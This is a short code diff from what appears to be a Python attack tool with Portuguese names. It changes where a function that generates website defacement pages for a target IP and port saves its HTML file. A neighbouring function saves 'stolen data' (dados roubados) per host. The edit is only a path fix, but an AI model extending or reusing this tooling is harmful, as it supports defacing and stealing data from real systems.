@@ -279,7 +279,14 @@ def guarda_dados_roubados(ip, dados):
             f.write(f"URLs: {', '.join(dados['urls'][:3])}\n")
 
 def gera_deface(ip, porta):
-    nome = f"/tmp/deface_{ip.replace('.', '_')}_{porta}.html"
+    """Gera um deface HTML"""
+    # ===== CORREÇÃO: PASTA CORRETA PARA WINDOWS =====
+    if os.name == 'nt':  # Windows
+        base_dir = os.getcwd()  # Pasta atual do projeto
+    else:  # Linux/Mac
+        base_dir = "/tmp"
+    
+    nome = os.path.join(base_dir, f"deface_{ip.replace('.', '_')}_{porta}.html")
     
     html = f'''<!DOCTYPE html>
 <html>
